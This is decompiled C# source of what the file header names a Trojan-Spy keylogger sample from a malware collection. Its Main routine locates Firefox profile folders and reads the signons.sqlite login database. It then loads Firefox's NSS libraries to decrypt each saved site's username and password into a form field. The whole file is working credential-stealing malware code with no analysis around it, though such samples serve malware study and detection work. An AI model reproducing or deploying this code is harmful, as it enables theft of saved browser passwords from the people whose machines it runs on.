// Decompiled with JetBrains decompiler
// Type: Roy.Module1
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic.CompilerServices;
using Roy.My;
using System;
using System.Collections;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Roy
{
  [StandardModule]
  internal sealed class Module1
  {
    private static IntPtr NSS3;
    public static string signon;

    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string dllFilePath);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    public static long NSS_Init(string configdir)
    {
      string str = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
      Module1.LoadLibrary(str + "mozcrt19.dll");
      Module1.LoadLibrary(str + "nspr4.dll");
      Module1.LoadLibrary(str + "plc4.dll");
      Module1.LoadLibrary(str + "plds4.dll");
      Module1.LoadLibrary(str + "ssutil3.dll");
      Module1.LoadLibrary(str + "sqlite3.dll");
      Module1.LoadLibrary(str + "nssutil3.dll");
      Module1.LoadLibrary(str + "softokn3.dll");
      Module1.NSS3 = Module1.LoadLibrary(str + "nss3.dll");
      return ((Module1.DLLFunctionDelegate) Marshal.GetDelegateForFunctionPointer(Module1.GetProcAddress(Module1.NSS3, nameof (NSS_Init)), typeof (Module1.DLLFunctionDelegate)))(configdir);
    }

    public static long PK11_GetInternalKeySlot() => ((Module1.DLLFunctionDelegate2) Marshal.GetDelegateForFunctionPointer(Module1.GetProcAddress(Module1.NSS3, nameof (PK11_GetInternalKeySlot)), typeof (Module1.DLLFunctionDelegate2)))();

    public static long PK11_Authenticate(long slot, bool loadCerts, long wincx) => ((Module1.DLLFunctionDelegate3) Marshal.GetDelegateForFunctionPointer(Module1.GetProcAddress(Module1.NSS3, nameof (PK11_Authenticate)), typeof (Module1.DLLFunctionDelegate3)))(slot, loadCerts, wincx);

    public static int NSSBase64_DecodeBuffer(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen)
    {
      return ((Module1.DLLFunctionDelegate4) Marshal.GetDelegateForFunctionPointer(Module1.GetProcAddress(Module1.NSS3, nameof (NSSBase64_DecodeBuffer)), typeof (Module1.DLLFunctionDelegate4)))(arenaOpt, outItemOpt, inStr, inLen);
    }

    public static int PK11SDR_Decrypt(
      ref Module1.TSECItem data,
      ref Module1.TSECItem result,
      int cx)
    {
      return ((Module1.DLLFunctionDelegate5) Marshal.GetDelegateForFunctionPointer(Module1.GetProcAddress(Module1.NSS3, nameof (PK11SDR_Decrypt)), typeof (Module1.DLLFunctionDelegate5)))(ref data, ref result, cx);
    }

    public static void Main()
    {
      string str1 = (string) null;
      bool flag = false;
      string str2 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
      string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
      int index1 = 0;
      while (index1 < directories.Length)
      {
        string str3 = directories[index1];
        if (!flag)
        {
          string[] files = Directory.GetFiles(str3);
          int index2 = 0;
          while (index2 < files.Length)
          {
            string input = files[index2];
            if (!flag)
            {
              if (Regex.IsMatch(input, "signons.sqlite"))
              {
                Module1.NSS_Init(str3);
                Module1.signon = input;
              }
              checked { ++index2; }
            }
            else
              break;
          }
          checked { ++index1; }
        }
        else
          break;
      }
      string signon = Module1.signon;
      Module1.TSECItem tsecItem = new Module1.TSECItem();
      Module1.TSECItem result1 = new Module1.TSECItem();
      Module1.TSECItem result2 = new Module1.TSECItem();
      SQLiteBase sqLiteBase = new SQLiteBase(signon);
      DataTable dataTable1 = sqLiteBase.ExecuteQuery("SELECT * FROM moz_logins;");
      DataTable dataTable2 = sqLiteBase.ExecuteQuery("SELECT * FROM moz_disabledHosts;");
      try
      {
        foreach (DataRow row in dataTable2.Rows)
          str1 = str1 + Environment.NewLine + "------------------".ToString();
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      Module1.PK11_Authenticate(Module1.PK11_GetInternalKeySlot(), true, 0L);
      try
      {
        foreach (DataRow row in dataTable1.Rows)
        {
          string str4 = Convert.ToString(row["formSubmitURL"].ToString());
          str1 = str1 + Environment.NewLine + "Site: " + str4;
          StringBuilder inStr1 = new StringBuilder(row["encryptedUsername"].ToString());
          IntPtr num = new IntPtr(Module1.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr1, inStr1.Length));
          Module1.TSECItem structure1 = (Module1.TSECItem) Marshal.PtrToStructure(num, typeof (Module1.TSECItem));
          if (Module1.PK11SDR_Decrypt(ref structure1, ref result1, 0) == 0 && result1.SECItemLen != 0)
          {
            byte[] numArray = new byte[checked (result1.SECItemLen - 1 + 1)];
            num = new IntPtr(result1.SECItemData);
            Marshal.Copy(num, numArray, 0, result1.SECItemLen);
            str1 = str1 + Environment.NewLine + "User name: " + Encoding.ASCII.GetString(numArray);
          }
          StringBuilder inStr2 = new StringBuilder(row["encryptedPassword"].ToString());
          num = new IntPtr(Module1.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr2, inStr2.Length));
          Module1.TSECItem structure2 = (Module1.TSECItem) Marshal.PtrToStructure(num, typeof (Module1.TSECItem));
          if (Module1.PK11SDR_Decrypt(ref structure2, ref result2, 0) == 0 && result2.SECItemLen != 0)
          {
            byte[] numArray = new byte[checked (result2.SECItemLen - 1 + 1)];
            num = new IntPtr(result2.SECItemData);
            Marshal.Copy(num, numArray, 0, result2.SECItemLen);
            str1 = str1 + Environment.NewLine + "Password: " + Encoding.ASCII.GetString(numArray) + Environment.NewLine;
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      MyProject.Forms.Form1.TextBox7.Text = MyProject.Forms.Form1.TextBox7.Text + str1 + Environment.NewLine;
      MyProject.Forms.Form1.TextBox7.Text = MyProject.Forms.Form1.TextBox7.Text + "----------------" + Environment.NewLine;
    }

    public class SHITEMID
    {
      public static long cb;
      public static byte[] abID;
    }

    public struct TSECItem
    {
      public int SECItemType;
      public int SECItemData;
      public int SECItemLen;
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate(string configdir);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate2();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate4(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate5(
      ref Module1.TSECItem data,
      ref Module1.TSECItem result,
      int cx);
  }
}
